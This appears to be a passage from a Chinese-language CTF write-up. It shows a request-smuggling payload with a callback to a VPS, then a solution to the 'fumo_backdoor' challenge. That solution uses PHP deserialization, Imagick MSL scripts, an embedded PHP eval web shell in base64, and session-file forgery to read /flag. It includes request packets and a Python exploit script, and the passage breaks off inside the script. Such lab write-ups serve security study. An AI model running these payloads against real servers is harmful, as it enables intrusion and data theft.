class="hljs-regexp">//</span><span class="hljs-number">115.239</span>.<span class="hljs-number">215.75</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/2023/</span>%<span class="hljs-number">20</span>HTTP<span class="hljs-regexp">/1.1%0D%0AHOST:127.0.0.1%0D%0A%0D%0AGET%20/</span><span class="hljs-number">2022</span>.php%<span class="hljs-number">3</span>Furl=<span class="hljs-number">1</span>xx.xxx.<span class="hljs-number">5</span>.xxx:<span class="hljs-number">2333</span><br>即<br><span class="hljs-regexp">/2023/</span> HTTP<span class="hljs-regexp">/1.1/</span>r<span class="hljs-regexp">/nHOST:localhost/</span>r<span class="hljs-regexp">/n/</span>r<span class="hljs-regexp">/n GET /</span><span class="hljs-number">2022</span>.php?url=VPS_ADDR:PORT<br></code></pre></td></tr></table></figure><p>我一开始构造的时候在最末尾的地方多加了HTTP&#x2F;1.1，导致走私失败。犯了这种低级错误。。还检查了好久才检查出来太傻比了😭😭😭</p><p>还有就是直接在web界面的url传参就可以了，我一开始还傻傻的想用BP做，BP做起来反而更麻烦。。。</p><p>然后就是使用url编码的时候不要把斜杠也一起编码了，这样会导致404 &#x3D; &#x3D;这个要记住，防止下次遇到相似情况会被坑。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230230324.png" alt="image-20230707024905076"></p><h3 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h3><p>这题乍一看只是个很简单的反序列化伪造，但是实际上涉及到反序列化，ImageMagick扩展，msl脚本语言，XXE包伪造。byd看wp的时候直接给我干蒙了，怎么会涉及到这么冷门的东西，这就是web吗😭😭😭</p><p>看看源码</p><p>首先是前面这两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;:/tmp&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;FUNC_LIST&quot;</span>, <span class="hljs-title function_ invoke__">get_defined_functions</span>());<br></code></pre></td></tr></table></figure><p><code>ini_set</code>是对php.ini里的值进行设置，且只在函数执行时生效，在脚本结束时失效。相当于是对当前文件的一个临时设置。其中<code>open_basedir</code>是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。所以这行的意思就是把我们的可以活动的目录限制在<code>tmp</code>目录下。当时的我以为只是把当前目录设置为<code>tmp</code>，并不知道有限制用户活动范围的意思。</p><p><code>get_defined_functions</code> ： 返回所有已定义函数的数组，包含了所有已定义的函数，包括内置&#x2F;用户定义的函数。</p><p>接着是反序列化的主体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fumo_backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$argv</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<br>            <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;path) &amp;&amp; <br>            <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[flag]/m&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;path) === <span class="hljs-number">0</span><br>        ) &#123;<br>            <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$this</span>-&gt;path);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span> (<br>            <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$func</span>) &amp;&amp; <br>            <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, FUNC_LIST[<span class="hljs-string">&quot;internal&quot;</span>])<br>        ) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$argv</span> = <span class="hljs-variable language_">$this</span>-&gt;argv;<br>            <span class="hljs-variable">$class</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br><span class="hljs-class">            </span><br><span class="hljs-class">            <span class="hljs-title">new</span> $<span class="hljs-title">class</span>($<span class="hljs-title">argv</span>);</span><br><span class="hljs-class">        &#125;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">$<span class="hljs-title">cmd</span> = $<span class="hljs-title">_REQUEST</span>[&#x27;<span class="hljs-title">cmd</span>&#x27;];</span><br><span class="hljs-class">$<span class="hljs-title">data</span> = $<span class="hljs-title">_REQUEST</span>[&#x27;<span class="hljs-title">data</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">switch</span> ($<span class="hljs-title">cmd</span>) </span>&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;unserialze&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>switch部分的代码提供两个功能，分别是反序列化化和删除当前目录文件。这里提供一个删除功能，我是没太搞清楚这个是为了干什么。经过测试做题前不清楚文件有时候也能正常出flag。应该是临时文件夹经常被写入东西，所以做题前需要清除一下防止干扰。</p><p>接着便是反序列化环节了</p><p>首先是<code>__weekup</code>可以通过反序列化触发，同时在<code>__weekup</code>函数里面有一个<code>call_user_func()</code>，这个函数会把第一个函数当做回调函数进行调用，其它参数当做回调函数的参数。因为题目中只给了一个参数，所以这里是一个无参调用。需要注意的是，由于if条件限制<code>call_user_func()</code>只能调用PHP的内部方法</p><p>接着是<code>__sleep()</code>，这个函数可以<code> readfile()</code>该函数读入一个文件并写入到输出缓冲。简单来说就是读文件并输出。在tmp文件夹下我们能读到的文件除了临时文件就是session文件了。同时，当下环境内唯一存在序列化的地方就是session了，所以要通过控制session进而来控制<code>__sleep()</code>的触发</p><p>按照正常流程来是通过phpinfo收集信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;fumo_backdoor&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;path&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;argv&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>这里有一个小坑就是构造无参调用的pop链的时候直接使用函数名即可，不需要括号。</p><p>可以看到用了imagick扩展</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231947103.png" alt="image-20230707211655131"></p><p>这题的其实与CISCN2022决赛的<a href="https://blog.wm-team.cn/index.php/archives/38/">一题</a>基本一样。</p><p>后面的解题步骤如下</p><ol><li>反序列化ImageMagick 利用msl类型和vid:msl:&#x2F;tmp&#x2F;php* 执行msl脚本</li><li>msl 用 mvg格式 把&#x2F;flag 读到&#x2F;tmp&#x2F;b</li><li>msl用inline可以base64 和8bim格式 写入一个session文件，用来反序列化</li><li>调用session_start，session被反序列化，休眠的时候被序列化触发sleep 读&#x2F;tmp&#x2F;b</li></ol><p>感觉没做过或者看过原题的话根本做不出来吧。。。太难了</p><p>按照github里的那篇文章可以知道</p><p><code>imagick</code>类在初始化的时候、可以执行<code>Magick Scripting Language</code>，即MSL脚本。所以可以在临时文件中写入MSL脚本，然后在<code>imagick</code>类初始化的时候执行临时文件，将其内容写入session文件。再触发<code>__sleep</code>包含读取session文件获得我们想要的内容。</p><blockquote><p>写入文件时须注意以下几点：</p><ol><li>因为<code>imagick</code>对文件格式解析较严，需要写入的文件必须是其支持的图片格式，如jpg、gif、ico等。如果直接插入<code>session</code>数据，会导致解析图片错误，导致文件无法写入。</li><li><code>php</code>对<code>session</code>的格式解析也较为严格。数据尾不可以存在脏数据，否则<code>session</code>解析错误会无法触发<code>__sleep</code>。</li></ol></blockquote><blockquote><p>MSL 代表 Magick 脚本语言。 它是一种内置的 ImageMagick 语言，有助于读取图像、执行图像处理任务以及将结果写回文件系统。</p></blockquote><p>首先是<code>cmd=rm</code>清除一下临时文件</p><p>编写反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fumo_backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$argv</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fumo_backdoor</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">imagick</span>&quot;;</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">argv</span>=&quot;<span class="hljs-title">vid</span>:<span class="hljs-title">msl</span>:/<span class="hljs-title">tmp</span>/<span class="hljs-title">php</span>*&quot;;</span><br><span class="hljs-class"><span class="hljs-title">echo</span> <span class="hljs-title">serialize</span>($<span class="hljs-title">a</span>);</span><br></code></pre></td></tr></table></figure><p><code>vid:msl:/tmp/php*</code>中的<code>vid</code>指的是使用vid方案，这种方案可以用于解析掩码（即可以用*来匹配）通过使用 vid: 方案，我们可以将临时文件包含在 MSL 内容中，而无需知道其名称.</p><p><code>msl</code>则是指使用MSL对文件进行解析，同时MSL脚本使用XML文档进行编写与传输。</p><p>接下来是XML文档的编写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data://image/x-portable-anymap;base64,</span></span><br><span class="hljs-string"><span class="hljs-tag">UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="hljs-string"><span class="hljs-tag">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="hljs-string"><span class="hljs-tag">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRb</span></span><br><span class="hljs-string"><span class="hljs-tag">MV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7</span></span><br><span class="hljs-string"><span class="hljs-tag">czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/tmp/sess_se&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中base64的内容是ppm格式的图片，并在结尾插入了脏数据。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230217404.png" alt="image-20230708005741597"></p><p>构造请求包</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">POST /?data=O:<span class="hljs-number">13</span>:<span class="hljs-meta">%22fumo_backdoor</span><span class="hljs-meta">%22:4:</span><span class="hljs-meta">%7Bs:4:</span><span class="hljs-meta">%22path</span><span class="hljs-meta">%22</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22argv</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">17</span>:<span class="hljs-meta">%22vid:msl:</span>/tmp/php*<span class="hljs-meta">%22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22func</span><span class="hljs-meta">%22</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-meta">%22class</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">7</span>:<span class="hljs-meta">%22imagick</span><span class="hljs-meta">%22</span>;<span class="hljs-meta">%7D</span>&amp;cmd=unserialze HTTP/<span class="hljs-number">1.1</span><br>HOST: <span class="hljs-number">182.92</span>.<span class="hljs-number">6.230</span>:<span class="hljs-number">18080</span><br>Accept:*/*<br>Content-Type: multipart/form-data;boundary=------------------------c32aaddf3d8fd979<br><br>--------------------------c32aaddf3d8fd979<br>Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;swarm&quot;</span>; filename=<span class="hljs-string">&quot;swarm.msl&quot;</span><br>Content-Type: application/octet-stream<br><br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data://image/x-portable-anymap;base64,</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRb</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">MV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot;</span> /&gt;</span></span><br><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/tmp/sess_se&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">--------------------------c32aaddf3d8fd979</span><br></code></pre></td></tr></table></figure><p>第一个请求包在反序列化进行了<code>imagick</code>类初始化。同时传输XML文档，写入文件sess_se，这样在session_start的时候cookie设置为PHPSESSID&#x3D;se的时候就可以直接读取该文件内容进行反序列化进入readfile。</p><p>接着构造第二个请求包把flag读到tmp的sess_s4mmy文件中，用于后续反序列化的包含</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;mvg:/flag&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/tmp/sss&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以总共是有两个临时文件一个是用于session反序列化，另一个是用于写入flag，并在反序列化的时候包含输出。</p><p>一开始没理清这个逻辑，我饶了好久😭😭😭</p><p>第二个请求包</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xquery">POST /?data=O:<span class="hljs-number">13</span>:<span class="hljs-meta">%22fumo_backdoor</span><span class="hljs-meta">%22:4:</span><span class="hljs-meta">%7Bs:4:</span><span class="hljs-meta">%22path</span><span class="hljs-meta">%22</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22argv</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">17</span>:<span class="hljs-meta">%22vid:msl:</span>/tmp/php*<span class="hljs-meta">%22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22func</span><span class="hljs-meta">%22</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-meta">%22class</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">7</span>:<span class="hljs-meta">%22imagick</span><span class="hljs-meta">%22</span>;<span class="hljs-meta">%7D</span>&amp;cmd=unserialze HTTP/<span class="hljs-number">1.1</span><br>HOST: <span class="hljs-number">182.92</span>.<span class="hljs-number">6.230</span>:<span class="hljs-number">18080</span><br>Accept:*/*<br>Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979<br><br>--------------------------c32aaddf3d8fd979<br>Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;swarm&quot;</span>; filename=<span class="hljs-string">&quot;swarm.msl&quot;</span><br>Content-Type: application/octet-stream<br><br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;mvg:/flag&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/tmp/sss&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><br>------------------------c32aaddf3d8fd979<br></code></pre></td></tr></table></figure><p>最后再携带PHPSESSID&#x3D;se去同时执行session_start()触发<code>__sleep</code>包含flag文件</p><p>这里我自己手动试了两天都不能出flag，但是网上的一个脚本能把flag跑出来，还是研究一下脚本吧😭😭😭太难了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests, base64, time<br>SERVER_ADDR = <span class="hljs-string">&quot;http://182.92.6.230:18080/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del_tempd</span>() -&gt; <span class="hljs-literal">None</span>:<br>    resp = requests.post(SERVER_ADDR, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;rm&quot;</span>,&#125;)<br>    <span class="hljs-built_in">print</span>(resp.status_code)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_file</span>(<span class="hljs-params">xml: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-comment"># Imagick(&quot;vid:msl:/tmp/php*&quot;)</span><br>    unserialize = base64.b64decode(<span class="hljs-string">b&#x27;TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9&#x27;</span>)<br>    resp = requests.post(SERVER_ADDR,files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exec1.msl&quot;</span>,xml)&#125;,data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;unserialze&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>:unserialize&#125;)<br>    <span class="hljs-built_in">print</span>(resp.status_code)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_phpinfo</span>() -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(SERVER_ADDR + <span class="hljs-string">&quot;?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_new_php_session</span>() -&gt; <span class="hljs-built_in">str</span>:<br>    resp = requests.get(SERVER_ADDR + <span class="hljs-string">&quot;?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>)[<span class="hljs-number">10</span>:<span class="hljs-number">42</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">session_start</span>(<span class="hljs-params">session_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    resp = requests.get(SERVER_ADDR + <span class="hljs-string">&quot;?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: session_id&#125;)<br>    <span class="hljs-built_in">print</span>(resp.text)<br><br>del_tempd()<br>time.sleep(<span class="hljs-number">2</span>)<br><br>session_id = get_new_php_session()<br><span class="hljs-built_in">print</span>(session_id)<br>time.sleep(<span class="hljs-number">2</span>)<br><br>del_tempd()<br>time.sleep(<span class="hljs-number">2</span>)<br><br>xml = <span class="hljs-string">f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;group&gt;</span><br><span class="hljs-string">&lt;image &gt;</span><br><span class="hljs-string"> &lt;read filename=&quot;mvg:/flag[20x20+20+20]&quot;/&gt;</span><br><span class="hljs-string">&lt;/image&gt;</span><br><span class="hljs-string">&lt;write filename=&quot;mvg:/tmp/yyz&quot;/&gt;</span><br><span class="hljs-string">&lt;/group&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>xml2 = <span class="hljs-string">f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;group&gt;</span><br><span class="hljs-string">&lt;image &gt;</span><br><span class="hljs-string">&lt;read filename=&quot;inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;/&gt;</span><br><span class="hljs-string">&lt;/image&gt;</span><br><span class="hljs-string">&lt;write filename=&quot;8BIM:/tmp/sess_<span class="hljs-subst">&#123;session_id&#125;</span>&quot;/&gt;</span><br><span class="hljs-string">&lt;/group&gt;</span><br><span 